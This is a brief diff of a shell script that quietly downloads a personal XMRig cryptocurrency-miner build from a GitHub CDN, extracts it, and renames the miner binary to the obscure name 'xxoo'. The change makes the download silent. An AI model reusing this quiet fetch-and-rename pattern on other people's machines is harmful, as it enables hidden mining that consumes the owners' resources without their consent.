@@ -4,7 +4,7 @@
 
 rm -rf xmrig-personal-shoguncao-6.22.2.tar.gz
 rm -rf xmrig-personal-shoguncao-6.22.2
-wget https://github.com/shoguncao/CDN/raw/xmrig/xmrig/xmrig-personal-shoguncao-6.22.2.tar.gz
+wget -q https://github.com/shoguncao/CDN/raw/xmrig/xmrig/xmrig-personal-shoguncao-6.22.2.tar.gz
 tar -xvf xmrig-personal-shoguncao-6.22.2.tar.gz
 mv xmrig-personal-shoguncao-6.22.2/xmrig xxoo
 rm -rf xmrig-personal-shoguncao-6.22.2.tar.gz
